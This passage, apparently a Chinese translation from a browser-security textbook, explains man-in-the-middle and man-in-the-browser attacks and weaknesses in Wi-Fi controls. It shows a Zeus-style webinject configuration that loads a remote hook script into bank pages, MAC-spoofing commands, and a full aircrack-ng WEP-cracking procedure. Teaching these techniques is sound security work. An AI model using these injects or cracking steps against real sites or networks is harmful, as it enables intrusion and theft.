
假设你利用的方法在目标浏览器中嵌入初始化控制代码，不需要依赖通信端点的滥用。一种较老的技术，即中间人攻击（Man-in-the-Middle attack，MitM），自人类开始通过不受信任的通道发送消息以来，一直是一种流行的攻击技术。

其概念很简单。攻击涉及对手窃听，甚至在发送方和接收方之间的通信通道途中修改通信内容。为了攻击成功，发送方和接收方都不能确定其通信已被窥探或篡改。

加密学的挑战之一是开发安全通信技术，特别是降低中间人攻击的可能性。因此，许多加密算法主要致力于提升机密性和完整性。正如所有安全增强和流程一样，每向前迈出一步，行业在保护信息和通信安全方面的进展，攻击者也会迅速跟进，寻找绕过这些安全控制的方法。

随着浏览器逐渐成为获取信息的标准方式，它在通过不受信任通道发送或接收信息方面也发挥着重要作用。这为你提供了一个非常有用的途径，用于在浏览器中注入初始代码。

### Man-in-the-Browser

传统上，MitM 攻击发生在 OSI 模型的较低层，确实是在应用层（即 HTTP 等）之下。Man-in-the-Browser（MitB）攻击是传统 MitM 攻击的兄弟，完全在浏览器内部进行。大多数持续的 JavaScript 通信（钩子）逻辑的核心特征实际上是一种 MitB 攻击，体现出以下特性：

*   `隐藏在用户之外`
*   `隐藏在服务器之外`
*   `能够修改当前页面的内容`
*   `能够读取当前页面的内容`
*   `不需要受害者介入`

这种拦截方式也常见于银行恶意软件攻击（例如 Zeus 或 SpyEye，它们提供注入功能）。这些便捷功能允许 Botnet 操作者指定配置文件，描述如何以及注入什么到 HTTP(S) 响应中。注入完全在浏览器内部进行，且不破坏或干扰浏览器内的 SSL 控制。例如：

```
set_url https://www.yourbank.com/*
data_before
<div class='footer'>
data_end
data_inject
<script src='https://browserhacker.com/hook.js'></script>
data_end
data_after
</body>
data_end
```

通用的 Zeus 配置文件会在浏览器访问 https://www.yourbank.com/ 以内的任何页面时激活。它会查找文本 `<div class='footer'>`，并在其之后插入新的 JavaScript 远程资源。这与你之前检查的初始控制示例是相同的。当该内容渲染后，浏览器会认为该内容来自合法网站。

如果攻击者能够在系统上执行进程，特别是当这发生在浏览器的相同处理空间内时，那么对于受害者来说局势基本上已经结束。这类恶意软件通常具备不止 HTML 注入的功能，通常还包括表单抓取、操作系统级别的键盘记录以及截图获取。

### 无线攻击

无线网络技术的最大进步之一是无线网络的开发和爆炸式增长。正如 Uncle Ben 向蜘蛛侠所说：“With great power, comes great responsibility.”，拥有强大的技术带来巨大的责任。

在所有颠覆性技术中，无线网络在安全研究人员和网络工程师之间一直是争议较大的。当然，一旦通信开始通过空中传输，摆脱有线限制，它们立即面临来自更多 adversaries 的威胁。

无线网络（尤其是 IEEE 802.11 系列）的最初威胁是攻击者窃听通过空中传输的通信内容。Fluhrer、Mantin 和 Shamir 在 2001 年首次发表了关于窃听无线网络流量的研究，这仅是在 802.11 标准初始 ratification 几年后。随后，展示绕过有线等效隐私（WEP）控制的工具相继发布。

**802.11 安全控制** 自 IEEE 802.11 问世以来，安全控制被引入以降低无线传输的机密性、完整性或可用性丧失的可能性。随时间推移，安全界对这些控制的弱点进行了批判性分析。以下是无线控制及其缺陷的简要概述。**SSID 隐藏** 大多数路由器允许不广播其服务集标识符（SSID）。遗憾的是，为了使无线客户端能够运行，它们通常会请求连接到命名的 SSIDs，这实际上会泄露该信息。像 Kismet 或 Aircrack 这样的工具可以帮助你发现 SSIDs。**静态 IP 过滤** 与 SSID 隐藏类似，静态 IP 过滤可能看似限制了无线路由器的 DHCP 连接，但 IP 地址可以通过无线工具被发现，并手动配置在攻击者的无线接口上。**MAC 地址过滤** 与 IP 过滤面临相同的问题。攻击者使用无线工具确定已连接的 MAC 地址后，可以将自身的 MAC 地址修改为匹配其中一个已连接客户端的 MAC 地址。在 Windows 上，你可以在无线适配器的高级属性中配置“网络地址”设置来修改 MAC 地址。在 Linux 上，可以使用 ifconfig 命令修改 MAC 地址：

```
ifconfig <interface> hw ether <MAC address>
```

OS X 与 Linux 类似：

```
sudo ifconfig <interface> ether <MAC address>
```

**WEP** 你可以使用 Aircrack-ng23 套件轻松破解 WEP 密钥：Level1 **1.** 启动能够注入流量的无线适配器的监听模式：

```
airmon-ng start <adaptor - for example: wifi0>
 <wireless channel - for example: 9>
```

这将把被动接口置于监听模式。 **2.** 使用监听模式适配器测试数据包注入。这通常是与 wifi0 不同的适配器，例如 Atheros 接口：

```
aireplay-ng -9 -e <SSID of target network>
 -a <MAC of target access point>
 <passive interface - for example: ath0>
```

 **3.** 开始捕获 WEP 初始化向量：

```
airodump-ng -c <wireless channel - for example: 9>
 --bssid <MAC of target access point>
 -w output <passive interface – for example: ath0>
```

 **4.** 将自身的 MAC 地址关联到无线接入点：

```
aireplay-ng -1 0 -e <SSID of target network>
 -a <MAC of target access point>
 -h <Our MAC address> <passive interface - for example: ath0>
```

 **5.** 启动 Aireplay-ng 的 ARP 请求重放模式，生成 WEP 初始化向量：

```
aireplay-ng -3 -b <MAC of target access point>
 -h <Our MAC address>
 <passive interface - for example: ath0>
```

/Level1 现在输出 cap 文件应正在增长，其中包含包括 WEP 初始化向量在内的流量。要在其内部破解 WEP 凭据，执行以下命令：

```
aircrack-ng -b <MAC of target access point> output*.cap
```

或

```
aircrack-ng -K -b <MAC of target access point> output*.cap
```

